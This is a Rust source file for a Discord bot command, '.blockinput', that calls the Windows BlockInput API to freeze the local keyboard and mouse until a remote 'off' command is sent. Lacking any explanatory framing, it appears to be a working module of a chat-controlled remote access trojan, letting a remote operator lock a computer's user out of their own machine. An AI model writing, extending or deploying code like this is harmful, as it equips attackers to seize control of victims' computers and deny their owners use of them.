use crate::prelude::*;
use windows::Win32::UI::Input::KeyboardAndMouse::BlockInput;
use std::sync::Mutex;
use std::sync::mpsc::{self, Sender};
use once_cell::sync::Lazy;

static BLOCK_CONTROLLER: Lazy<Mutex<Option<Sender<()>>>> = Lazy::new(|| Mutex::new(None));

#[poise::command(prefix_command)]
pub async fn blockinput(
    ctx: PoiseContext<'_>,
    #[description = "on/off"]
    #[rest]
    state: Option<String>,
) -> Result<(), Error> {
    let state = match state {
        Some(s) => s.to_lowercase(),
        None => {
            ctx.say("Usage: `.blockinput <on|off>`").await?;
            return Ok(());
        }
    };

    match state.as_str() {
        "on" | "true" | "1" => {
            let (tx, rx) = mpsc::channel();
            
            let installed = {
                let mut guard = BLOCK_CONTROLLER.lock().unwrap();
                if guard.is_some() {
                    false
                } else {
                    *guard = Some(tx);
                    true
                }
            };

            if !installed {
                ctx.say("Input is already blocked.").await?;
                return Ok(());
            }

            std::thread::spawn(move || {
                unsafe {
                   let _ = BlockInput(true);
                   let _ = rx.recv();
                   let _ = BlockInput(false);
                }
            });

            ctx.say("Input blocked.").await?;
        }
        "off" | "false" | "0" => {
            let tx_opt = { BLOCK_CONTROLLER.lock().unwrap().take() };

            if let Some(tx) = tx_opt {
                let _ = tx.send(());
                ctx.say("Input unblocked.").await?;
            } else {
                ctx.say("Input was not blocked (or blocked by another process).").await?;
            }
        }
        _ => {
            ctx.say("Usage: `.blockinput <on|off>`").await?;
        }
    }

    Ok(())
}
